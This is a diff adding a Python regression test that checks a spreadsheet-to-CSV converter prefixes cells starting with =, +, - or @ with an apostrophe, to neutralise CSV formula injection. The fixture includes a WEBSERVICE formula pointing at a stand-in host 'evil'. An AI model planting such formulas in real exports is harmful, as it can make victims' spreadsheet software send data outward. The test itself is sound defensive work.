@@ -101,3 +101,29 @@ def test_backend_empty_body_raises(tmp_path):
 def test_rows_to_sheet_plus_random_ids():
     md = rows_to_sheet_plus_format([["a", "b"], ["1", "2"]], "T", "")
     assert md.startswith("---")
+
+
+def test_backend_csv_formula_injection_neutralized(tmp_path):
+    # mar #2 PoC 回归：= + - @ 开头单元格落盘为 '=… 前缀；普通单元格逐字节不变
+    import json, zlib
+    from pathlib import Path
+    data = {"data": {"0": {"0": {"v": "名称"}, "1": {"v": "值"}},
+                     "1": {"0": {"v": "=WEBSERVICE(\"http://evil/\")"},
+                           "1": {"v": "1+1 结果"}},
+                     "2": {"0": {"v": "+100"}, "1": {"v": "-200"}},
+                     "3": {"0": {"v": "@cmd"}, "1": {"v": "普通"}}}}
+    body = json.dumps({"format": "lakesheet",
+                       "sheet": zlib.compress(json.dumps(data).encode()).decode("latin-1")})
+    p = tmp_path / "s.json"
+    p.write_text(json.dumps({"doc": {"type": "Sheet", "format": "lakesheet", "body": body}}),
+                 encoding="utf-8")
+    entry = FileEntry(Path("书/表"), p, Category.LAKE_SHEET, meta={"sheet_format": "csv"})
+    task = Task(entry, tmp_path / "表.csv", tmp_path / "表.assets", False)
+    LakeSheetBackend().convert(p, tmp_path / "表.assets", task)
+    import csv as _csv
+    with (tmp_path / "表.csv").open(encoding="utf-8-sig") as f:
+        rows = list(_csv.reader(f))
+    assert rows[1][0] == "'=WEBSERVICE(\"http://evil/\")"   # CSV 读回：前缀 ' 生效
+    assert rows[2] == ["'+100", "'-200"]
+    assert rows[3] == ["'@cmd", "普通"]   # 普通单元格无前缀、逐字节不变
+    assert rows[1][1] == "1+1 结果"   # 非开头的 + 不受影响
